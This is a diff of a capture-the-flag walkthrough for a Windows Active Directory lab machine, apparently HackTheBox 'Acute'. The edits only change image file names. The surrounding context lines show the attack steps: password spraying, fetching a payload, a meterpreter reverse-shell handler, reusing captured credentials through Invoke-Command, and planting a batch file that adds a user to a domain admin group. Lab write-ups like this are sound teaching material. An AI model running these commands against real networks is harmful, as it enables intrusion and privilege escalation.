@@ -64,7 +64,7 @@ I view the page source code, There's nothing of interest to be found here.
 
 Under /about.html there is a section on "who we work with" and within this text there are some names.
 
-![](<../../.gitbook/assets/image (31) (1) (1).png>)
+![](<../../.gitbook/assets/image (31) (1) (1) (1).png>)
 
 I make a list of the names as firstname.lastname in a user.txt file.
 
@@ -84,7 +84,7 @@ Under First 3 Months, there is a section that provides a link to a "Remote train
 
 
 
-![](<../../.gitbook/assets/image (26) (1) (1).png>)
+![](<../../.gitbook/assets/image (26) (1) (1) (1).png>)
 
 
 
@@ -123,7 +123,7 @@ Using usernames.txt and Password1 against atsserver.acute.local and acute-pc01.a
 
 I finally get a foodhold.
 
-![](<../../.gitbook/assets/image (6) (1).png>)
+![](<../../.gitbook/assets/image (6) (1) (1).png>)
 
 ### Some quick enumeration
 
@@ -238,7 +238,7 @@ python -m http.server 9090
 
 ![](<../../.gitbook/assets/image (1) (1) (1).png>)
 
-![](<../../.gitbook/assets/image (17) (1) (1).png>)
+![](<../../.gitbook/assets/image (17) (1) (1) (1).png>)
 
 From my Remote Powershell I download the payload to C:\Utils
 
@@ -262,7 +262,7 @@ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse
 
 Once connected, I use 'screenshare' to save a html file where I can view the desktop of the current user.
 
-![](<../../.gitbook/assets/image (15) (1) (1).png>)
+![](<../../.gitbook/assets/image (15) (1) (1) (1).png>)
 
 When viewing the screen, user1 is attempting to Connect to the ATSSERVER via WINRM. He uses.
 
@@ -290,7 +290,7 @@ To test the credentials, I know I cannot enter-pssession but I can try invoke-co
 Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $creds -command {whoami} 
 ```
 
-![](<../../.gitbook/assets/image (5) (1).png>)
+![](<../../.gitbook/assets/image (5) (1) (1).png>)
 
 The result returns: acute\user2. - This is successful, I have confirmed the password.
 
@@ -309,7 +309,7 @@ Under C:\Program Files\ there is a directory named 'keepmeon' - I haven't seen t
 
 Upon trying to CD into keepmeon, I am denied access.
 
-![](<../../.gitbook/assets/image (8) (1).png>)
+![](<../../.gitbook/assets/image (8) (1) (1).png>)
 
 I continue to enumerate accounts.
 
@@ -369,7 +369,7 @@ User flag owned.
 
 For wm.ps1.
 
-![](<../../.gitbook/assets/image (25) (1).png>)
+![](<../../.gitbook/assets/image (25) (1) (1).png>)
 
 The script apperas to invoke a command back on acute-pc01 of get-volume under the credentials of user4.
 
@@ -431,7 +431,7 @@ I know from our Domain Group enumeration that the Site Admins group is named 'Si
 
 I can create a .bat file that will add user3 to the site\_admins group. Knowing that I cannot create and download the file, I will need to create it through Powershell.
 
-![](<../../.gitbook/assets/image (31) (1).png>)
+![](<../../.gitbook/assets/image (31) (1) (1).png>)
 
 ```
 Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $creds -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin user3 /add /domain'}
@@ -439,7 +439,7 @@ Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential 
 
 I double check the content with 'cat'
 
-![](<../../.gitbook/assets/image (24) (1).png>)
+![](<../../.gitbook/assets/image (24) (1) (1).png>)
 
 ```
 Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $creds -ScriptBlock {cat 'c:\program files\Keepmeon\admin.bat'}
